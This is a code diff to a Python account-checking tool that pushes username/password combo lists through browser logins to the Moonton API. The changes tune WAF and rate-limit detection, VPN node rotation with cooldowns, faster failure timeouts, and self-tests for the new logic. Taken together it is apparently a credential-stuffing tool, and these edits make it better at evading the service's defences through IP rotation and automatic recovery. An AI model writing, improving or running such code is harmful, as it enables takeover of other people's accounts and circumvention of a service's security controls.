@@ -513,6 +513,7 @@ class _SpeedDetector:
         self.last_heal_t = 0.0
         self.total_checks = 0
         self.peak_rate = 0.0
+        self.session_peak = 0.0
         self.was_drop = False
         self.samples: deque[float] = deque()
         self.stalls: deque[tuple[float, str, float]] = deque()
@@ -521,9 +522,9 @@ class _SpeedDetector:
     def resume(self, now_t: float | None = None):
         t = time.monotonic() if now_t is None else now_t
         self.last_check_t = t
-        self.pause_until_t = t + 12.0
-        # ponytail: decay peak_rate gently instead of wiping to 0 so slow new nodes (e.g. 1/s vs 3/s) are still caught
-        self.peak_rate *= 0.85
+        self.pause_until_t = t + 10.0
+        # ponytail: keep session_peak intact across rotations so repeated bad nodes never blind the detector
+        self.peak_rate = 0.0
         self.drop_since_t = 0.0
         self.was_drop = False
         self.samples.clear()
@@ -545,7 +546,10 @@ class _SpeedDetector:
         if len(self.samples) >= 8:
             span = t - self.samples[0]
             if span >= 12.0:
-                self.peak_rate = max(self.peak_rate, (len(self.samples) - 1) / span)
+                rate_now = (len(self.samples) - 1) / span
+                self.peak_rate = max(self.peak_rate, rate_now)
+                if len(self.samples) >= 14 and span >= 18.0:
+                    self.session_peak = max(self.session_peak, rate_now)
 
     def record_stall(self, kind: str, dur_s: float, now_t: float | None = None):
         if dur_s < 0.25 or kind not in self.totals:
@@ -573,25 +577,26 @@ class _SpeedDetector:
         recent_cut = t - 12.0
         recent_cnt = sum(1 for ts in self.samples if ts >= recent_cut)
         cur_rate = 0.0 if idle_s >= 15.0 else (recent_cnt / max(recent_span, 10.0))
-        warmed = self.total_checks >= 6 and elapsed >= 12.0 and self.peak_rate > 0 and t >= self.pause_until_t
-        is_drop = warmed and (cur_rate < self.peak_rate * 0.55 or (idle_s >= 12.0 and stats.get('workers', 0) > 0))
+        target_peak = max(self.peak_rate, self.session_peak * 0.85)
+        warmed = self.total_checks >= 6 and elapsed >= 12.0 and target_peak > 0 and t >= self.pause_until_t
+        is_drop = warmed and (cur_rate < target_peak * 0.58 or (idle_s >= 10.0 and stats.get('workers', 0) > 0))
         if is_drop:
             if self.drop_since_t == 0.0:
                 self.drop_since_t = t
-        elif warmed and self.peak_rate > 0 and cur_rate >= self.peak_rate * 0.65:
+        elif warmed and target_peak > 0 and cur_rate >= target_peak * 0.70:
             self.drop_since_t = 0.0
         win_totals = {}
         for _, k, d in self.stalls:
             win_totals[k] = win_totals.get(k, 0.0) + d
         tag, desc, pct = self._dominant(win_totals)
-        return is_drop, tag, desc, pct, cur_rate, self.peak_rate
+        return is_drop, tag, desc, pct, cur_rate, target_peak
 
-    def should_auto_heal(self, now_t: float | None = None, min_drop_s: float = 15.0, cooldown_s: float = 40.0) -> tuple[bool, str, float, float]:
+    def should_auto_heal(self, now_t: float | None = None, min_drop_s: float = 10.0, cooldown_s: float = 28.0) -> tuple[bool, str, float, float]:
         t = time.monotonic() if now_t is None else now_t
         is_drop, tag, _, _, cur_r, peak_r = self.evaluate(t)
         if not is_drop or peak_r < 0.6:
             return False, tag, cur_r, peak_r
-        if t < (self.pause_until_t + 12.0) or (t - self.last_heal_t) < cooldown_s:
+        if t < (self.pause_until_t + 8.0) or (t - self.last_heal_t) < cooldown_s:
             return False, tag, cur_r, peak_r
         if self.drop_since_t <= 0.0 or (t - self.drop_since_t) < min_drop_s:
             return False, tag, cur_r, peak_r
@@ -2283,20 +2288,32 @@ class VpnCoordinator:
             cmd.extend(['--auth-user-pass', os.path.abspath(self.ovpn_auth)])
         return cmd
 
+    @staticmethod
+    def _ovpn_is_tcp(cfg: str) -> bool:
+        return bool(re.search(r'[._-]tcp\.ovpn$', cfg or '', re.I))
+
+    @staticmethod
+    def _ovpn_group_key(cfg: str) -> str:
+        bn = os.path.basename(cfg or '')
+        return re.sub(r'[._-](udp|tcp)\.ovpn$', '', bn, flags=re.I)
+
     def _pick_next_ovpn(self) -> str:
         n = len(self.ovpn_files)
         now_t = time.monotonic()
         best_idx = self.ovpn_idx % n
-        best_cd = float('inf')
+        best_score = (2, 2, float('inf'))
         for off in range(n):
             idx = (self.ovpn_idx + off) % n
             cand = self.ovpn_files[idx]
-            cd = self.ovpn_cooldown_until.get(cand, 0.0)
-            if cd <= now_t:
+            gk = self._ovpn_group_key(cand)
+            cd = max(self.ovpn_cooldown_until.get(cand, 0.0), self.ovpn_cooldown_until.get(gk, 0.0))
+            tcp_rank = 1 if self._ovpn_is_tcp(cand) else 0
+            if cd <= now_t and tcp_rank == 0:
                 self.ovpn_idx = idx + 1
                 return cand
-            if cd < best_cd:
-                best_cd = cd
+            sc = (0 if cd <= now_t else 1, tcp_rank, cd)
+            if sc < best_score:
+                best_score = sc
                 best_idx = idx
         self.ovpn_idx = best_idx + 1
         return self.ovpn_files[best_idx]
@@ -2305,9 +2322,12 @@ class VpnCoordinator:
         cfg = self.cur_ovpn_cfg
         if not cfg:
             return
-        pen = self.ovpn_penalties.get(cfg, 0) + 1
-        self.ovpn_penalties[cfg] = pen
-        self.ovpn_cooldown_until[cfg] = time.monotonic() + min(600.0, 90.0 * pen)
+        gk = self._ovpn_group_key(cfg)
+        pen = self.ovpn_penalties.get(gk, 0) + 1
+        self.ovpn_penalties[gk] = pen
+        cd_until = time.monotonic() + min(1800.0, 180.0 * pen)
+        self.ovpn_cooldown_until[cfg] = cd_until
+        self.ovpn_cooldown_until[gk] = cd_until
 
     async def start_ovpn(self, cfg_override: str = '', timeout_s: float = 22.0, settle_s: float = 2.0) -> tuple[bool, str]:
         global _ovpn_pid
@@ -2641,7 +2661,7 @@ class VpnCoordinator:
         if fatal_perm or not live:
             self.ovpn_files = []
             return []
-        live.sort(key=lambda x: x[0])
+        live.sort(key=lambda x: x[0] + (400 if self._ovpn_is_tcp(x[1]) else 0))
         self.ovpn_files = [cfg for _, cfg, _ in live]
         self.ovpn_idx = 0
         p_out(f" {c(GREEN)}[ OK ]{W} {len(live)}/{total} OpenVPN lolos uji API Moonton (tercepat: {os.path.basename(live[0][1])} {live[0][0]}ms)")
@@ -2707,8 +2727,9 @@ class VpnCoordinator:
         self.consec_waf_rate = 0
         self._recent_outcomes.append(True)
         if self.cur_ovpn_cfg and len(self._recent_outcomes) == self._recent_outcomes.maxlen and all(self._recent_outcomes):
-            if self.ovpn_penalties.get(self.cur_ovpn_cfg, 0) > 0:
-                self.ovpn_penalties[self.cur_ovpn_cfg] -= 1
+            gk = self._ovpn_group_key(self.cur_ovpn_cfg)
+            if self.ovpn_penalties.get(gk, 0) > 0:
+                self.ovpn_penalties[gk] -= 1
 
     def _waf_tripped(self) -> bool:
         if self.consec_waf_rate >= self.waf_threshold:
@@ -3318,16 +3339,17 @@ async def do_login_via_browser(page, ctx, user: str, passw: str, wid: int = 0, w
             except Exception:
                 pass
 
-        # Event-driven wait up to 12s (wakes immediately on fast JSON, 405 WAF, or HTTP 407/429/5xx)
+        # Event-driven wait (4s bila request belum terkirim agar cepat fail-fast, 8.5s bila XHR aktif)
         t_resp0 = time.monotonic()
+        _resp_wait_s = 8.5 if req_sent.is_set() else 4.0
         try:
-            await asyncio.wait_for(resp_event.wait(), timeout=12.0)
+            await asyncio.wait_for(resp_event.wait(), timeout=_resp_wait_s)
         except asyncio.TimeoutError:
             pass
         _wait_dt = time.monotonic() - t_resp0
         if api_result["had_waf"]:
             _PERF.record_stall('waf', _wait_dt)
-        elif api_result["proxy_err"] or _wait_dt >= 5.0:
+        elif api_result["proxy_err"] or _wait_dt >= 2.5:
             _PERF.record_stall('proxy', _wait_dt)
         if api_result["proxy_407"] and not api_result["json"]:
             return 'ERR', {'message': '407_TRAFFIC_EXHAUSTED', 'proxy_407': True}
@@ -3776,7 +3798,10 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                 _PERF.record_stall('lock', time.monotonic() - t_vpn_lk)
                 if vpn_coord.ovpn_failed:
                     return False
+            if NUM_CONTEXTS >= 6 and wid > 0 and (ctx_vpn_epoch != vpn_coord.epoch or stats['proxy_ctx'] < NUM_CONTEXTS):
+                await asyncio.sleep(min(1.8, (wid % 12) * 0.14))
 
+        _recycle_thresh = max(120, NUM_CONTEXTS * 15)
         if browser_state is not None:
             if not browser_state['gate'].is_set():
                 t_lk = time.monotonic()
@@ -3788,7 +3813,7 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
             elif (
                 ensure_browser
                 and not browser_state['recycling']
-                and (stats['proxy_ctx'] - browser_state['born_ctx']) >= 100
+                and (stats['proxy_ctx'] - browser_state['born_ctx']) >= _recycle_thresh
                 and (not wave_limit or stats['checked'] < wave_limit - 15)
             ):
                 browser_state['recycling'] = True
@@ -4309,7 +4334,7 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                                 pre_vpn_gen = ctx_gen
                                 if await vpn_coord.coordinate('proactive', seen_vpn_ep, browser_state, stats):
                                     await _recover_ctx(pre_vpn_gen, 'rotate')
-                            elif ctx_accts >= ACCOUNTS_PER_CTX or (browser_state is not None and (browser_state['recycling'] or (stats['proxy_ctx'] - browser_state['born_ctx']) >= 100)):
+                            elif ctx_accts >= ACCOUNTS_PER_CTX or (browser_state is not None and (browser_state['recycling'] or (stats['proxy_ctx'] - browser_state['born_ctx']) >= max(120, NUM_CONTEXTS * 15))):
                                 await _recover_ctx(my_gen, 'periodic_rotate')
                         break
 
@@ -4430,6 +4455,8 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                         if not await _recover_ctx(my_gen, 'rotate'):
                             raise RuntimeError(f"w{wid}_rate_recovery_failed")
                     else:
+                        if vpn_coord and any(k in err_low for k in ('timeout', 'timed_out', 'not_loaded', 'err_', 'reset', 'refused', 'aborted')):
+                            await vpn_coord.on_waf_or_rate(seen_vpn_ep, err_msg[:20] or 'net_err', browser_state, stats)
                         err_mode = 'rotate' if _acct_retries[k_id] >= 2 else 'waf_refresh'
                         if not await _recover_ctx(my_gen, err_mode):
                             raise RuntimeError(f"w{wid}_err_recovery_failed")
@@ -4628,12 +4655,12 @@ async def async_main():
             _disc = _discover_ovpn_dirs(_td)
             assert [lbl for lbl, _, _ in _disc] == ['vpns', 'vpn-proton', 'vpn-surfshark', 'vpns/hma'], _disc
         vc.ovpn_dir = ''
-        # 5. Smart stability: node cooldown & intermittent WAF rolling window + auto-heal trigger
-        vc.ovpn_files = ['a.ovpn', 'b.ovpn', 'c.ovpn']
+        # 5. Smart stability: UDP-first + group cooldown, intermittent WAF & persistent session_peak auto-heal
+        vc.ovpn_files = ['mm_udp.ovpn', 'mm_tcp.ovpn', 'sg_tcp.ovpn', 'sg_udp.ovpn']
         vc.ovpn_idx = 0
-        vc.cur_ovpn_cfg = 'a.ovpn'
+        vc.cur_ovpn_cfg = 'mm_udp.ovpn'
         vc._penalize_current_ovpn()
-        assert vc._pick_next_ovpn() == 'b.ovpn'
+        assert vc._pick_next_ovpn() == 'sg_udp.ovpn'
         vc.consec_waf_rate = 0
         vc._recent_outcomes.clear()
         for idx_o in range(10):
@@ -4645,12 +4672,17 @@ async def async_main():
         assert vc._waf_tripped(), "Intermittent WAF (80%) must trip rotation even if record_ok resets consec_waf_rate"
         sd_t = _SpeedDetector()
         sd_t.reset(now_t=100.0)
-        for i in range(15):
-            sd_t.mark_check(now_t=100.0 + i * 1.0)
-        sd_t.peak_rate = 3.0
-        sd_t.record_stall('waf', 4.0, now_t=130.0)
-        assert not sd_t.should_auto_heal(now_t=130.0)[0]
-        assert sd_t.should_auto_heal(now_t=146.0)[0]
+        for i in range(60):
+            sd_t.mark_check(now_t=100.0 + i * 0.34)
+        assert sd_t.session_peak >= 2.5
+        for k_r in range(5):
+            sd_t.resume(now_t=125.0 + k_r)
+        assert sd_t.session_peak >= 2.5
+        for i in range(12):
+            sd_t.mark_check(now_t=140.0 + i * 1.0)
+        sd_t.record_stall('waf', 4.0, now_t=151.0)
+        assert not sd_t.should_auto_heal(now_t=145.0)[0]
+        assert sd_t.should_auto_heal(now_t=161.0)[0]
         vc.ovpn_files = []
         vc.ovpn_failed = True
         try:
@@ -5025,7 +5057,7 @@ async def async_main():
                     _LIVE_LOGS.append(f" {c(GOLD)}!{W}  {c(GOLD)}SMART HEAL: recycle browser ({h_cur:.2f} vs {h_peak:.2f}/s){W}")
                     if not _TUI_ACTIVE:
                         p_out(f"  {c(GOLD)}[SMART] Speed drop ({h_cur:.2f} vs {h_peak:.2f}/s, {h_tag}) -> recycle Chromium...{W}")
-                    browser_state['born_ctx'] = stats['proxy_ctx'] - 100
+                    browser_state['born_ctx'] = stats['proxy_ctx'] - max(120, NUM_CONTEXTS * 15)
                     _PERF.pause_until_t = time.monotonic() + 20.0
                 elif vpn_coord is not None and (len(vpn_coord.ovpn_files) > 1 or vpn_coord.vpn_cmd):
                     _LIVE_LOGS.append(f" {c(GOLD)}!{W}  {c(GOLD)}SMART HEAL: {h_cur:.2f} vs {h_peak:.2f}/s ({h_tag}) -> rotasi VPN{W}")
